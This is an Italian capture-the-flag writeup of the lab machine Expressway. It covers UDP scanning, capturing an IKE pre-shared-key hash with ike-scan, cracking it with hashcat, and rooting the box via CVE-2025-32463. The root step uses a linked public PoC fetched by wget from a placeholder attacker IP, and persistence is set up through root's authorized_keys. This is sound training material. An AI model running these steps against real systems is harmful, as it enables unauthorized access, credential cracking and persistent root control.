+++
date = '2026-06-27T23:50:00+02:00'
draft = false
title = 'Expressway Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`21/09/2025`**

![Expressway.jpeg](/images/imgs_expressway/Expressway.jpeg)

---
# Introduzione

**_Expressway_** la prima macchina rilasciata durante la Season 9 (**Gacha**). Un box **Linux** di livello **Easy** che mette in risalto due concetti fondamentali e testati spesso nei penetration test: l'importanza dell'enumerazione **UDP** e la necessità di rimanere aggiornati sulle vulnerabilità recenti.

L'accesso iniziale si basa sulla scoperta di un servizio **IPSec/IKE VPN** esposto su una porta **UDP**, estraendone l'hash della **Pre-Shared Key** (**PSK**) per poi craccarlo offline e ottenere l'accesso tramite **SSH**. Per la privilege escalation, un'attenta osservazione durante l'enumerazione manuale rivela un comportamento non standard di **sudo**, portando alla scoperta di una recente vulnerabilità critica (**CVE-2025-32463**) che consente di compromettere il sistema.

---
# Tecniche Utilizzate

- **IPSec IKE VPN | Estrazione Pre-Shared Key Hash**

- **Password Cracking**

- **Privilege Escalation → CVE-2025-32463**

---
# Enumerazione

## nmap TCP

Scansione iniziale su tutte le porte:

```bash
nmap -p- expressway -T4
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV expressway -T4
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porta Aperta**:
- **22**/tcp - SSH

Lo scan **TCP** ha rivelato una porta **SSH** standard. Ho controllato la versione per cercare eventuali **CVE**, ma non ho trovato nulla di immediatamente sfruttabile. Quindi, ho lanciato una scansione **UDP**.

## nmap UDP

```bash
nmap -sU expressway.htb
```

```bash
PORT STATE SERVICE
53/udp closed domain
67/udp closed dhcps
68/udp open|filtered dhcpc
69/udp open|filtered tftp
123/udp closed ntp
135/udp closed msrpc
137/udp closed netbios-ns
138/udp closed netbios-dgm
139/udp closed netbios-ssn
161/udp closed snmp
162/udp closed snmptrap
445/udp closed microsoft-ds
500/udp open isakmp
514/udp closed syslog
520/udp closed route
631/udp closed ipp
1434/udp closed ms-sql-m
1900/udp closed upnp
4500/udp open|filtered nat-t-ike
49152/udp closed unknown
```

**Porte Aperte**:
- **68**/udp - filtered dhcpc
- **69**/udp - filtered tftp
- **500**/udp - isakmp (IKE)
- **4500**/udp - filtered nat-t-ike

Poiché non avevo molta familiarità con il servizio **isakmp**, ho cercato su Google. Ho trovato una guida molto dettagliata e utile su:

- https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp.

La porta **500 UDP** è la porta standard usata per il protocollo **Internet Key Exchange** (**IKE**), utilizzato per stabilire una **security association** (**SA**) all'interno della suite di protocolli **IPsec**. Oltre a spiegare i concetti di base, la guida illustra anche come enumerare e attaccare il servizio.

## Enumerazione IKE & Estrazione Hash 

Ho utilizzato **ike-scan** per enumerare il servizio.

```bash
ike-scan -M expressway 
```

![ike-scan1.png](/images/imgs_expressway/ike-scan1.png)

Successivamente ho tentato un **Aggressive Mode handshake**, che può forzare il server VPN a restituire l'hash della **Pre-Shared Key** (**PSK**).

```bash
ike-scan -M -A expressway --pscrack=hash.txt
```

![ike-hash.png](/images/imgs_expressway/ike-hash.png)

**Nota**: _Nell'**Aggressive Mode** di **IKEv1**, l'hash di autenticazione viene trasmesso prima che il canale sicuro sia completamente stabilito. Questo permette a un attaccante di catturare l'hash (in questo caso, appartenente all'utente **ike**) e tentare di craccarlo offline._

---
# Accesso Iniziale | Offline Cracking → SSH

Ho salvato l'hash e ho consultato la pagina ufficiale **Hashcat Example Hashes**:

    https://hashcat.net/wiki/doku.php?id=example_hashes

per far combaciare il formato del hash estratto e trovare il numero di modulo corretto da utilizzare:

![hashcat-mode.png](/images/imgs_expressway/hashcat-mode.png)

**5400**, ho avviato **Hashcat** utilizzando la wordlist **`rockyou.txt`**:

```bash
hashcat -m 5400 output.txt /usr/share/wordlists/rockyou.txt
```

![cracked.png](/images/imgs_expressway/cracked.png)

Ho usato l'username precedentemente scoperto (**ike**) e la password craccata per loggarmi tramite **SSH**.

```bash
ssh ike@expressway
```

![initial-access.png](/images/imgs_expressway/initial-access.png)

All'interno di **`/home/ike`**, ho trovato la **user flag**.

![userflag.png](/images/imgs_expressway/userflag.png)

---
# Privilege Escalation | CVE-2025-32463

A questo punto ho iniziato la mia consueta enumerazione manuale. Una delle prime cose che controllo sempre, quando ho a disposizione la password dell'utente, sono i permessi di **sudo**.

```bash
sudo -l
```

![sudo-message.png](/images/imgs_expressway/sudo-message.png)

Ho notato qualcosa di strano. Il prompt e il messaggio di output non sembravano provenire dal binario standard originale di **sudo**. Riconoscendo questa anomalia, ho indagato un po' più a fondo per vedere esattamente quale binario **sudo** venisse eseguito e la sua versione specifica.

```bash
which sudo
sudo --version
```

![sudo-version.png](/images/imgs_expressway/sudo-version.png)

La versione restituita era vulnerabile a una falla critica molto recente: la **CVE-2025-32463**.

**Nota**: _La **CVE-2025-32463** è una grave vulnerabilità di privilege escalation legata al modo in cui una versione specifica di **sudo** gestisce l'ambiente **chroot** e gli input dell'utente. Manipolando le variabili d'ambiente, un attaccante può eludere le restrizioni previste ed eseguire comandi arbitrari come utente **root**._

Ho cercato una **Proof of Concept** (**PoC**) pubblica su **GitHub**:

- https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/blob/main/sudo-chwoot.sh

Ho scaricato lo script e l'ho trasferito sul target tramite un semplice **Python HTTP server**.

```bash
# Attacker Machine
python3 -m http.server 8000

# Target Machine
wget http://<attacker_ip>:8000/sudo-chwoot.sh
chmod +x sudo-chwoot.sh
```

Ho eseguito lo script:

```bash
./sudo-chwoot.sh
```

![system_proof.png](/images/imgs_expressway/system_proof.png)

**Woot! (⌐■_■) We are in.** 

L'exploit ha funzionato perfettamente, bypassando le restrizioni e fornendomi direttamente una **root shell**.

All'interno di **`/root`** era presente la **root flag**:

![rootflag.png](/images/imgs_expressway/rootflag.png)

## Persistenza

A questo punto volevo stabilire un accesso più stabile e persistente. Questa è una cosa che faccio sempre, poiché mi permette di studiare ulteriormente il sistema, ispezionare le configurazioni e prendere appunti dettagliati senza dover lanciare di nuovo l'intero exploit.

Per farlo, ho semplicemente copiato la chiave pubblica **SSH** della mia macchina attaccante (**`~/.ssh/id_rsa.pub`**) e l'ho aggiunta al file **`authorized_keys`** nella root directory del target.

```bash
cd .ssh
echo "ssh-ed25519 your_public_key_here" >> /root/.ssh/authorized_keys
```

![persistence.png](/images/imgs_expressway/persistence.png)

```bash
ssh -i id_ed25519 root@expressway
```

![persistence_proof.png](/images/imgs_expressway/persistence_proof.png)

---
## Considerazioni Finali

**_Expressway_** è un ottimo box Easy che rafforza le competenze fondamentali di enumerazione costringendo, al tempo stesso, a rimanere aggiornati sulle vulnerabilità attuali.

Incontrare un servizio poco familiare sulla porta **500** (**IKE**) è stata un'ottima opportunità di apprendimento per fare un passo indietro, ricercare la suite di protocolli **IPsec** e leggere la documentazione esterna prima di attaccare.

Inoltre, la fase di privilege escalation è stata un ottimo promemoria per non dare mai per scontati i binari di sistema standard.

**Fonti**:
- **Pentesting IPSec IKE VPN**: https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting
- **Guida per IKE-Scan**: https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp
- **Esempi di Hashcat Hashes**: https://hashcat.net/wiki/doku.php?id=example_hashes
- **Spiegazione CVE-2025-32463**: https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-privilege-escalation-flaw
- **PoC CVE-2025-32463**: https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/blob/main/sudo-chwoot.sh